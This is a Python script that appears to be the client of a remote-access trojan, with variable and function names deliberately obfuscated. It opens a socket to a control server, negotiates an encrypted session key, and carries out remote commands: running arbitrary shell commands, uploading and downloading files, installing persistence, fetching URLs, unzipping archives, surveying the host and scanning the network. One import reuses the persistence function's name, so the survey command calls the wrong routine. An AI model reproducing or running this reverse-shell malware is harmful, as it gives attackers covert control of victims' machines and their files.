#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import fKVDYrzdKZVcijwKGIciPJNJhgUGEXQd, tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq, LECdLVZAGyQcqbGIHqDblBKNeiBWnwkS
    from core.filesock import rmKLLEJCqgoJgOaymQmnoOotvYFjGJwt, gKBMfnwhSSxqoYgKzwEAFFmdZUXetvKm
    from core.persistence import riZaDmNOsluzUlWxKfMZLiUcvOhUrTuc
    from core.scan import kXXXRVfuUYZNQGSSpKiUekvTkBCiaQQG
    from core.survey import riZaDmNOsluzUlWxKfMZLiUcvOhUrTuc
    from core.toolkit import heKCnAtKSPPzAttcFMAgPDiEOYCKLulX, BCKwnkdhaeEKirDhgeLvQLbhwrLlyeGW
except ImportError as ucOmuZOuIhcXiuGPmcTSVoQyNPAoiLVT:
    print(ucOmuZOuIhcXiuGPmcTSVoQyNPAoiLVT)
    sys.exit(0)
nKizTYvRJouBBEvqSZJFdiTRbVviNWgx = sys.platform
UChJhSnGOaxYBOsrKFvWeZUfVUWmwsra      = 'localhost'
zzTyXoJjiJINsncOqPGjcAuYVjNhNDQM      = 1337
GHeDDCRnHFZaExiwVeNKjaSOtFANDvGB    = 'b14ce95fa4c33ac2803782d18341869f'
def AIFsrozZCqmWETKOCZVZEkGBgdjHQRWl():
    hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY = socket.socket()
    hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.connect((UChJhSnGOaxYBOsrKFvWeZUfVUWmwsra, zzTyXoJjiJINsncOqPGjcAuYVjNhNDQM))
    HRVsYDaowExNJmhzSYkosedOJuOiUyNV = LECdLVZAGyQcqbGIHqDblBKNeiBWnwkS(hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY)
    while True:
        FTAwFMBnyYlLQChPOZpAGjfppfwzroiL = hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.recv(1024)
        FTAwFMBnyYlLQChPOZpAGjfppfwzroiL = fKVDYrzdKZVcijwKGIciPJNJhgUGEXQd(FTAwFMBnyYlLQChPOZpAGjfppfwzroiL, HRVsYDaowExNJmhzSYkosedOJuOiUyNV)
        uOGCjvxCoZgwanneHIIgovUCPFSerqXc, _, action = FTAwFMBnyYlLQChPOZpAGjfppfwzroiL.partition(' ') 
        if uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'quit':
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.close()
            sys.exit(0)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'run':
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl.stdout.read() + IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl.stderr.read()
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.sendall(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'download':
            for UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl in action.split():
                UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl = UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl.strip()
                gKBMfnwhSSxqoYgKzwEAFFmdZUXetvKm(hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY, UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'upload':
            for UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl in action.split():
                UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl = UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl.strip()
                rmKLLEJCqgoJgOaymQmnoOotvYFjGJwt(hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY, UPjPUktdPamGxNAzLwFyJdyGcAbiuDAl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'rekey':
            HRVsYDaowExNJmhzSYkosedOJuOiUyNV = LECdLVZAGyQcqbGIHqDblBKNeiBWnwkS(hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY)
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'persistence':
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = riZaDmNOsluzUlWxKfMZLiUcvOhUrTuc(nKizTYvRJouBBEvqSZJFdiTRbVviNWgx)
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.send(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'wget':
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = heKCnAtKSPPzAttcFMAgPDiEOYCKLulX(action)
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.send(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'unzip':
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = BCKwnkdhaeEKirDhgeLvQLbhwrLlyeGW(action)
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.send(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'survey':
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = riZaDmNOsluzUlWxKfMZLiUcvOhUrTuc(nKizTYvRJouBBEvqSZJFdiTRbVviNWgx)
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.send(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
        elif uOGCjvxCoZgwanneHIIgovUCPFSerqXc == 'scan':
            IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl = kXXXRVfuUYZNQGSSpKiUekvTkBCiaQQG(action)
            hZQTGxmzGJgpoqWsNisEnfYpjCARWJwY.send(tWFjgkigGlBgJzJuDPvNFxkOVaoVHkvq(IKrJWSUPXzCeStfSjMGWSKcbkCNLtGGl, HRVsYDaowExNJmhzSYkosedOJuOiUyNV))
if __name__ == '__main__':
    AIFsrozZCqmWETKOCZVZEkGBgdjHQRWl()
